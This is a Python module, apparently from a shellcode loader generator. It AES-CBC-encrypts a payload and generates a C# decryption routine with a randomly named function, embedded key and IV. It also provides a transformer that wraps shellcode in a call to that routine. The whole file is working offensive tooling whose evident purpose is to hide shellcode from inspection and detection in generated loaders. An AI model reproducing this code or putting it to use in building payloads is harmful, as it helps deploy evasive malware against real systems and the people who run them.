import base64
import os
from utils.utils import bytes_to_cs, bytes_to_c
from Crypto.Cipher import AES
from Crypto.Util import Padding
import string
import random

class AESEncrypt:

    def __init__(self, arguments):
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))
        if 'key' in arguments:
            self.key = arguments['key'].encode()
        else:
            self.key = os.urandom(32)
        if 'iv' in arguments:
            self.iv = arguments['iv'].encode()
        else:
            self.iv = os.urandom(16)

    def compilerOptions(self):
        return []

    def imports(self):
        return ["using System.Security.Cryptography;"]

    def codeblock(self):
        return """
        public static byte[] {name}(byte[] ciphertext)
        {{
            byte[] plaintext;
            {key}
            {iv}
            using (Aes aesAlg = Aes.Create())
            {{
                aesAlg.BlockSize = 128;
                aesAlg.KeySize = 128;
                aesAlg.Mode = CipherMode.CBC;
                aesAlg.Key = key;
                aesAlg.IV = iv;
                aesAlg.Padding = PaddingMode.PKCS7;  

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                plaintext = decryptor.TransformFinalBlock(ciphertext, 0, ciphertext.Length);
            }}
            return plaintext;
        }}
""".format(name = self.name, key = bytes_to_cs(self.key, 'key'), iv = bytes_to_cs(self.iv, 'iv'))

    def encode(self, plaintext):
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        self.plaintextSize = len(plaintext)
        encrypted = cipher.encrypt(Padding.pad(plaintext, 16, style='pkcs7'))
        self.ciphertextSize = len(encrypted)
        return encrypted

    def transformer(self, shellcodestring):
        return shellcodestring.format(shellcode=f'{self.name}({{shellcode}})')